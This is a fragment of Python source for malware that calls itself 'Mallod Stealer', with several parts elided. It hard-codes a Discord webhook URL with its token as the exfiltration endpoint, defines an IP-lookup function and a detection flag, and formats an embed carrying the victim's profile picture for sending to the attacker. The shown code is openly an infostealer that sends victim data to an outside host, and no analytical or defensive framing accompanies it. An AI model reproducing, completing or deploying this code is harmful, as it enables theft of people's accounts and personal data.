...
hook='https://discord.com/api/webhooks/1104277277220552714/Hts5jYCyM2WrUvjKDAKGtKLcoYOUkS8nRFdZI-BT3AHO-T5j0YsBSuFPITIGDhSJ4s3m'
DETECTED=False
def getip():
    ip='None'
    try:
...
},
{
            ...
            'footer':{
                'text':'@Mallod Stealer',
                'icon_url':'https://cdn.discordapp.com/avatars/1089831727473635422/150dfd78134fac3ced01a41d01358d46.png?size=1024'
},
            'thumbnail':{
                'url':f"{pfp}"
}
        ...
        'avatar_url':'https://cdn.discordapp.com/avatars/1089831727473635422/150dfd78134fac3ced01a41d01358d46.png?size=1024',
        'username':'Mallod Stealer',
        'attachments':[]
}
